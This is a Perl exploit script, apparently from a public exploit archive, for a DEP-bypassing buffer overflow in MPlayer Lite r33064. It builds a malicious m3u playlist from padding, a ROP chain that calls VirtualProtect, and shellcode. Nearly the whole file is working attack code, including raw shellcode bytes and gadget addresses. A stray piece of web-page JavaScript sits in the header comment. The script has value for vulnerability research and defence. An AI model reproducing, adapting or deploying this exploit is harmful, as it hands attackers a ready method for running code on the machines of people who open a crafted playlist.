#!/usr/bin/perl
#
#[+]Exploit Title: MPlayer Lite r33064 m3u Buffer Overflow Exploit(DEP BYPASS)
#[+]Date: 24\07\2011
#[+]Author: C4SS!0 and h1ch4m
#[+]Software Link: http://sourceforge.net/projects/mplayer-ww/files/MPlayer_Release/Revision%2033064/mplayer_lite_r33064.7z/download
#[+]Version: Lite 33064
#[+]Tested On: WIN-XP SP3 x86 Brazilian Portuguese
#[+]CVE: N/A
#
#Created BY C4SS!0 G0M3S
#E-mail Louredo_@hotmail.com<script type="text/javascript">
/* <![CDATA[ */
(function(){try{var s,a,i,j,r,c,l=document.getElementById("__cf_email__");a=l.className;if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
/* ]]> */
</script>
#Site net-fuzzer.blogspot.com
#
#
 
use strict;
use warnings;
use IO::File;
 
print q
{
 
                Created BY C4SS!0 G0M3S
        Site net-fuzzer.blogspot.com
        E-mail Louredo_@hotmail.com
};
sleep(2);
 
my $shellcode =
"\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1".
"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30".
"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa".
"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96".
"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b". #Shellcode WinExec "Calc.exe"
"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a". #Badchars "\x00\x20\x0d\x0a"
"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83".
"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98".
"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61".
"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05".
"\x7f\xe8\x7b\xca";
 
 
 
my $rop .= "BBBB";
$rop .= "CCCD";
$rop .= pack('V',0x6496E0BB);# POP EDI # RETN  
$rop .= pack('V',0x6D7CBBE4);# Address to kernel32.VirtualProtect
 
##############################################ROP EXPLOIT######################################################################
$rop .= pack('V',0x649abc7b); # PUSH ESP # POP EBX # POP ESI # RETN 
$rop .= "BBBB"; #Junk
$rop .= pack('V',0x6B0402A9); # MOV EAX,EBX # POP EBX # RETN
$rop .= "\x01\x42\x42\x42"; #Junk
$rop .= pack('V',0x6AED7BAF); # POP ECX # RETN
$rop .= "\xff\xff\xff\xff";
$rop .= pack('V',0x6AD85749); # POP EBX # RETN
$rop .= "\x40\x40\x40\x40";
$rop .= pack('V',0x6ADB3A50); # INC ECX # ADD AL,5B # RETN
$rop .= pack('V',0x6ae00bf0); # ADD CL,BL # RETN
$rop .= pack('V',0x6AD85749); # POP EBX # RETN
$rop .= "\x02\x42\x42\x42";
 
$rop .= pack('V',0x6afa6dd8); # MOV EAX,40 # RETN
$rop .= pack('V',0x6b0817a0); # ADD AL,89 # RETN
$rop .= pack('V',0x6b0817a0); # ADD AL,89 # RETN
 
$rop .= pack('V',0x6ADA31E1); # ADD AH,BL # RETN  BL = 01
$rop .= pack('V',0x6B0B7A46); # MOV EDX,EAX # MOV EAX,EDX # RETN
$rop .= pack('V',0x649abc7b); # PUSH ESP # POP EBX # POP ESI # RETN
$rop .= "GGGG"; #Junk
 
$rop .= pack('V',0x6B0B7A46); # MOV EDX,EAX # MOV EAX,EDX # RETN
$rop .= pack('V',0x64975830); # POP EAX # RETN
$rop .= pack('V',0x64975918);
$rop .= pack('V',0x649B11EC); # PUSHAD # RETN
##############################################ROP END HER###########################################################################
 
my $buf = "\x41" x (4496-12);
$buf .= $rop;
$buf .= ("\x90" x 10).$shellcode; #You have a good space for shellcode here :)
$buf .= "\x41" x (5152-length($buf));
$buf .= "\xeb\x0f\xcc\xcc";
$buf .= pack('V',0x6497ab0c); # ADD ESP,17CC # POP EBX # POP ESI # POP EDI # POP EBP # RETN
 
 
$buf .= "\x90" x 400;
 
print "\t\t[+]Creating M3U File...\n";
sleep(1);
open(my $FILE,">Exploit.m3u") || die "**[x]Error:\n$!\n";
print $FILE "http:// ".$buf;
close($FILE);
print "\t\t[+]File Exploit.m3u Created with Success\n";
sleep(1);

